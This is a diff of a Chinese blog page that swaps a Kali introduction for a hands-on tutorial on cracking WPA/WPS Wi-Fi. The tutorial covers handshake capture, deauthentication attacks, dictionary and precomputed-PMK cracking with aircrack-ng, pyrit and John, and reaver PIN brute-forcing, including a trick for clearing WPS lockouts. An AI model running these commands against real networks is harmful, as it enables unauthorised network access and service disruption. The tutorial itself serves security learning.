@@ -157,7 +157,7 @@
     </script>
     
     <script defer type="text/javascript" src="/js/custom.js"></script>
-    <title>渗透测试及Kali初探 | Pyrrhax</title>
+    <title>无线渗透实操-Aircrack-ng-WPA/WPS | Pyrrhax</title>
   <meta name="generator" content="Hexo 4.2.1"></head>
   <body itemscope itemtype="http://schema.org/WebPage" lang="zh_CN"  data-spy="scroll" data-target=".list-group">
     
@@ -203,7 +203,7 @@
   
   <article class="article post card" itemscope itemtype="http://schema.org/Article">
     <div class="post-block">
-      <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%88%9D%E6%8E%A2/">
+      <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/08/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D-Aircrack-ng-WPA-WPS/">
       <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
        <meta itemprop="name" content="Pyrrhax">
        <meta itemprop="description" content="">
@@ -214,11 +214,11 @@
       </span>
     </div>
     <header class="post-header">
-      <h1 class="post-title" itemprop="name headline">渗透测试及Kali初探</h1>
+      <h1 class="post-title" itemprop="name headline">无线渗透实操-Aircrack-ng-WPA/WPS</h1>
       <div class="post-meta">
         
         <span class="post-date">
-          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2020-08-19T12:22:38+08:00">2020-08-19 12:22:38</time></span>
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2020-10-08T12:34:13+08:00">2020-10-08 12:34:13</time></span>
         </span>
         
         
@@ -236,75 +236,144 @@
       </div>
     </header>
     <main class="post-main" itemprop="articleBody">
-      <h1 id="渗透测试标准PETS"><a href="#渗透测试标准PETS" class="headerlink" title="渗透测试标准PETS"></a>渗透测试标准<a href="http://www.pentest-standard.org" target="_blank" rel="noopener">PETS</a></h1><ul>
-<li>前期交互阶段（与客户沟通，确定测试范围，测试方式，时间等。）</li>
-<li>情报收集阶段</li>
-<li>威胁建模阶段（分析，确定最可行的攻击通道。）</li>
-<li>漏洞分析阶段</li>
-<li>渗透攻击阶段</li>
-<li>后渗透测试阶段（尽可能展现威胁影响程度）</li>
-<li>渗透测试报告<a id="more"></a>
-</li>
-</ul>
-<hr>
-<h1 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h1><ul>
-<li>Kali命名参考印度神话</li>
-<li>基于Debian,前身是2013年3月发布的BackTrack</li>
-<li>用于渗透测试和安全审计</li>
-<li>包含600+安全工具</li>
-<li>FHS标准目录结构</li>
-<li><ul>
-<li>BackTrack将所有相关工具放在/pentest目录下，下分更细目录如web,database，有些工具很难界定放在哪个目录。</li>
+      <h2 id="无线渗透实操——Aircrack-ng-WPA-WPS"><a href="#无线渗透实操——Aircrack-ng-WPA-WPS" class="headerlink" title="无线渗透实操——Aircrack-ng(WPA/WPS)"></a>无线渗透实操——Aircrack-ng(WPA/WPS)</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ul>
+<li>启动monitor模式</li>
+<li>开始抓包并保存<ul>
+<li><code>airodump-ng wlan0mon -c&lt;channel&gt; --bssid&lt;bssid&gt; -w&lt;filename&gt;</code></li>
 </ul>
 </li>
-<li>定制内核（关于无线驱动）</li>
-<li>支持ARM和手机平台（Nethunter）</li>
-<li>开源免费（Offensi Security）</li>
+<li>Deauthentication攻击获取四步握手信息<ul>
+<li><code>aireplay-ng -0 &lt;count&gt; -a &lt;ap mac&gt; -c &lt;sta mac&gt; wlan0mon</code></li>
 </ul>
-<h1 id="Kali-Linux策略"><a href="#Kali-Linux策略" class="headerlink" title="Kali Linux策略"></a>Kali Linux策略</h1><ul>
-<li>Root用户策略（默认root）</li>
-<li>网络服务策略（默认全部关闭，新装软件默认启动脚本不启动，需要用update.rc.d命令）</li>
-<li>更新升级策略（随Debian,Offensive Security维护工具。）</li>
+</li>
+<li>字典暴破<ul>
+<li><code>aircrack-ng -w /user/share/john/password.list wpa-01.cap</code></li>
 </ul>
-<h1 id="Kali-VirtualBox-环境搭建"><a href="#Kali-VirtualBox-环境搭建" class="headerlink" title="Kali VirtualBox 环境搭建"></a>Kali VirtualBox 环境搭建</h1><ol>
-<li>首先下载kali官方的VirtualBox镜像。</li>
-<li>默认用户名密码是kali/kali,切换root用<code>sudo su</code></li>
-<li><code>apt-get update</code></li>
-<li><code>apt-get install linux-headers-$(uname -r)</code></li>
-<li>安装VirtualBox增强，点击Devices–&gt;Insert GuestAdditons CD image,在桌面会出现一个光盘图标的文件。<br>运行其中对应的.run文件。</li>
-</ol>
-<h1 id="Kali-持久加密USB安装"><a href="#Kali-持久加密USB安装" class="headerlink" title="Kali 持久加密USB安装"></a>Kali 持久加密USB安装</h1><ol>
-<li>VirtualBox共享Windows文件夹，将kali镜像放入其中</li>
-<li>插入U盘</li>
-<li>使用dmesg命令查看U盘名称（例：”sdb”）</li>
-<li>使用GParted将sdb分区删除</li>
-<li>使用dd命令将镜像按块写入U盘(使用watch命令查看进度，每5秒发送一次SIGUSR1信号)</li>
-<li>使用parted从上一分区结束位置创建分区</li>
-<li>使用LUKS加密分区<code>cryptsetup --verbose --verify-passphrase luksFormat /dev/sdb</code></li>
-<li>打开加密分区<code>cryptsetup luksOpen /dev/sdb3 usb</code></li>
-<li>mkfs.ext4 /dev/mapper/usb将分区格式化成ext4</li>
-<li>e2label /dev/mapper/usb persistence将分区卷标指定为persistence（必须是persistence——持久化的意思</li>
-<li>完成后，在mnt目录下创建一个文件夹，将分区挂载到该文件夹处，并填入配置文件。完成后卸掉挂载，并关闭加密区。</li>
-</ol>
-<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">mkdir -p &#x2F;mnt&#x2F;kali<br>mount &#x2F;dev&#x2F;mapper&#x2F;kali &#x2F;mnt&#x2F;kali<br>echo &quot;&#x2F; union&quot; &gt; &#x2F;mnt&#x2F;kali&#x2F;persistence.conf<br>umount &#x2F;dev&#x2F;mapper&#x2F;kali<br>cryptsetup luksClose &#x2F;dev&#x2F;mapper&#x2F;kali<br></code></pre></td></tr></table></figure>
+</li>
+</ul>
+<a id="more"></a>
 
-<h1 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h1><ul>
-<li>nmap            网络发现</li>
-<li>burpsuit         http请求中间人</li>
-<li>zap            http请求中间人</li>
-<li>sqlmap        SQL注入</li>
-<li>aircrack-ng    无线破解</li>
-<li>metasploit    渗透测试框架</li>
-<li>maltego        信息收集</li>
-<li>john            密码破解</li>
-<li>hydra            密码破解</li>
-<li>wireshark        抓包</li>
+<h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><ul>
+<li>网上共享的字典</li>
+<li>数据泄露</li>
+<li>地区电话号码字段</li>
+<li>Crunch生成</li>
+<li>Kali中自带的</li>
 </ul>
-<p>实时流量显示 NetSpeed</p>
-<p>#学习</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
+<li>Essid+PSK+迭代次数4096——Hash计算生成PMK（十分消耗CPU时间）</li>
+<li>PMK+Anounce+Snounce+MAC1+MAC2计算出PTK</li>
+</ul>
+<h3 id="Airolib"><a href="#Airolib" class="headerlink" title="Airolib"></a>Airolib</h3><ul>
+<li>先计算生成所有的PMK（计算资源消耗）</li>
+<li>PMK在破解阶段被用于计算PTK（速度快，计算资源要求少）</li>
+<li>通过完整性摘要值找到正确的PTK，再找到生成该PTK的PMK及相应的PSK</li>
+<li>SQLite3数据库存储数据</li>
+</ul>
+<h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><ul>
+<li><code>airolib-ng db --import essid essid.txt</code></li>
+<li><code>airolib-ng db --stats</code></li>
+<li><code>airolib-ng db --import passwd /usr/share/wordlists/rockyou.txt</code></li>
+<li><code>airolib-ng db --batch</code> 计算PMK</li>
+<li><code>aircrack-ng -r db wpa-02.cap</code></li>
+</ul>
+<h3 id="John-the-ripper"><a href="#John-the-ripper" class="headerlink" title="John the ripper"></a>John the ripper</h3><ul>
+<li>快速的密码破解软件</li>
+<li>支持基于规则动态生成密码字典</li>
+<li>很多人喜欢用手机号做无线密码<ul>
+<li>获取号段并动态增加后几位数字</li>
+</ul>
+</li>
+<li>配置文件/etc/john/john.conf<ul>
+<li>[List.Rules:Wordlist]</li>
+<li>$[0-9]$[0-9]$[0-9]$[0-9]</li>
+</ul>
+</li>
+<li><code>john --wordlist=yidong.txt --rules --stdout | aircrack-ng -e kifi -w - wpa-01.cap</code></li>
+</ul>
+<h3 id="Cowpatty"><a href="#Cowpatty" class="headerlink" title="Cowpatty"></a>Cowpatty</h3><ul>
+<li>同样用字典生成彩虹表再爆破</li>
+</ul>
+<h3 id="Pyrit"><a href="#Pyrit" class="headerlink" title="Pyrit"></a>Pyrit</h3><ul>
+<li>与airolib、cowpatty相同、支持基于预计算的PMK提高破解速度</li>
+<li>独有的优势<ul>
+<li>可以利用GPU</li>
+<li>本身支持抓包获取四步握手，无需使用Airodump</li>
+<li>支持读取airodump抓包获取四步握手的方式</li>
+</ul>
+</li>
+<li>只抓WAP四次握手过程包<ul>
+<li><code>pyrit -r wlan0mon -o wpapyrit.cap stripLive</code></li>
+<li><code>pyrit -r wpapyrit.cap analyze</code></li>
+</ul>
+</li>
+<li>从airodump抓包导入并筛选<ul>
+<li><code>pyrit -r wpa.cap -o wpapyrit.cap strip</code></li>
+</ul>
+</li>
+<li>使用密码直接破解<ul>
+<li><code>pyrit -r wpapyrit.cap -i password.list -b&lt;AP MAC&gt; attack passthrough</code></li>
+</ul>
+</li>
+<li>数据库模式破解<ul>
+<li>默认使用基于文件的数据库，支持连接SQL数据库，将计算的PMK存入数据库</li>
+<li>查看默认数据库状态:<code>pyrit eval</code></li>
+<li>导入密码字典：<code>pyrit -i password.list import passwords</code></li>
+<li>指定ESSID：<code>pyrit -e kifi create essid</code></li>
+<li>计算PMK：<code>pyrit batch</code>(发挥GPU计算能力)</li>
+<li>破解密码：<code>pyrit -r wpapyrit.cap -b &lt;AP MAC&gt; attack db</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="WPS-Wireless-Protected-Setup"><a href="#WPS-Wireless-Protected-Setup" class="headerlink" title="WPS(Wireless Protected Setup)"></a>WPS(Wireless Protected Setup)</h2><ul>
+<li>WPS是WiFi联盟2006年开发的一项技术<ul>
+<li>通过PIN码来简化无线接入的操作，无需记住PSK</li>
+<li>路由器和网卡各按一个按钮就能接入无线</li>
+<li>PIN码是分为前后各4位的2段共8位数字</li>
+</ul>
+</li>
+<li>安全漏洞<ul>
+<li>2011年被发现安全涉及漏洞</li>
+<li>接入发起方可以根据路由器的返回信息判断前四位是否正确</li>
+<li>而PIN码的后4位只有1000种定义的组合（最后一位是checksum）</li>
+<li>所以全部穷举破解只需要11000次尝试<ul>
+<li>PSK：218340105584896次</li>
+</ul>
+</li>
+<li>标准本身没有设计锁定机制，目前多个厂商已经实现锁定机制。</li>
+</ul>
+</li>
+</ul>
+<h4 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h4><ul>
+<li>启动侦听模式，发现支持WPS的AP<ul>
+<li><code>wash -C -i wlan0mon</code></li>
+<li><code>airodump-ng wlan0mon --wps</code></li>
+</ul>
+</li>
+<li>爆破pin码<ul>
+<li><code>reaver -i wlan0mon -b &lt;AP MAC&gt; -vv -c &lt;channel&gt;</code> </li>
+</ul>
+</li>
+<li>秒破PIN<ul>
+<li><code>reaver -i wlan0mon -b &lt;AP MAC&gt; -vv -K 1</code></li>
+<li>上面的命令其实调用的是<code>pixiewps</code></li>
+<li>只适用于固定厂商的芯片，成功率低</li>
+</ul>
+</li>
+<li>从pin码获得密码<code>reaver -i wlan0mon -b &lt;AP MAC&gt; -vv -p 88888888</code></li>
+<li>问题：<ul>
+<li>很多厂家实现了锁定机制，所以爆破时应注意限速</li>
+<li>一旦触发锁定，可尝试耗尽AP连接数，令其重启并解除WPS锁定</li>
+</ul>
+</li>
+<li>综合自动化无线密码破解工具wifite</li>
+</ul>
+<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>插入网卡前先执行</p>
 <ul>
-<li>实践是最好的老师，加油。</li>
+<li><code>service NetworkManager stop</code></li>
+<li><code>airmon-ng check kill</code></li>
 </ul>
+<p>否则插入网卡后wpa_supplicant会对网卡进行初始化，导致操作失败</p>
 
     </main>
     <footer class="post-footer">
@@ -322,12 +391,10 @@
   <nav class="page-nav">
     <div class="page-nav-next page-nav-item">
       
-      <a href="/2020/08/18/%E7%82%B9%E5%87%BB%E4%B8%8A%E6%96%B9%E7%9A%84%E5%85%B3%E4%BA%8E%E6%9F%A5%E7%9C%8B%E6%88%91%E7%9A%84%E6%9B%B4%E5%A4%9A%E4%BF%A1%E6%81%AF/" rel="next" title="点击上方的关于查看我的更多信息"><i class="fas fa-angle-left"></i><span class="nav-title">点击上方的关于查看我的更多信息</span></a>
+      <a href="/2020/10/06/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D-Aircrack-ng-WEP/" rel="next" title="无线渗透实操--Aircrack-ng:WEP"><i class="fas fa-angle-left"></i><span class="nav-title">无线渗透实操--Aircrack-ng:WEP</span></a>
       
     </div>
     <div class="page-nav-prev page-nav-item">
-      
-      <a href="/2020/08/21/Kali%E5%AE%9A%E5%88%B6/" rel="prev" title="Kali定制"><span class="nav-title">Kali定制</span><i class="fas fa-angle-right"></i></a>
       
     </div>
   </nav>
@@ -354,7 +421,7 @@
       "client_secret": "71b8ae2203a2a15d590a6866959b732267194412",
       "no_comment": "这个页面还没有评论，现在就去评论吧！",
       "go_to_comment": "去评论",
-      "issue_title": "渗透测试及Kali初探",
+      "issue_title": "无线渗透实操-Aircrack-ng-WPA/WPS",
       "btn_class": "button",
       "comments_target": "#comment-thread"
     });
@@ -449,7 +516,7 @@
     <hr>
     <div class="post-toc sidebar-item" id="toc-div">
       <div><i class="fas fa-list-ol"></i>文章目录</div>
-      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-1"><a class="list-group-item toc-link" href="#渗透测试标准PETS"><span class="toc-text">渗透测试标准PETS</span></a></li><li class="toc-item toc-level-1"><a class="list-group-item toc-link" href="#Kali"><span class="toc-text">Kali</span></a></li><li class="toc-item toc-level-1"><a class="list-group-item toc-link" href="#Kali-Linux策略"><span class="toc-text">Kali Linux策略</span></a></li><li class="toc-item toc-level-1"><a class="list-group-item toc-link" href="#Kali-VirtualBox-环境搭建"><span class="toc-text">Kali VirtualBox 环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="list-group-item toc-link" href="#Kali-持久加密USB安装"><span class="toc-text">Kali 持久加密USB安装</span></a></li><li class="toc-item toc-level-1"><a class="list-group-item toc-link" href="#常用工具"><span class="toc-text">常用工具</span></a></li></ol></div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#无线渗透实操——Aircrack-ng-WPA-WPS"><span class="toc-text">无线渗透实操——Aircrack-ng(WPA&#x2F;WPS)</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#步骤"><span class="toc-text">步骤</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#字典"><span class="toc-text">字典</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#原理"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Airolib"><span class="toc-text">Airolib</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#操作"><span class="toc-text">操作</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#John-the-ripper"><span class="toc-text">John the ripper</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Cowpatty"><span class="toc-text">Cowpatty</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Pyrit"><span class="toc-text">Pyrit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#WPS-Wireless-Protected-Setup"><span class="toc-text">WPS(Wireless Protected Setup)</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#操作-1"><span class="toc-text">操作</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#其它"><span class="toc-text">其它</span></a></li></ol></li></ol></div>
     </div>
     
     
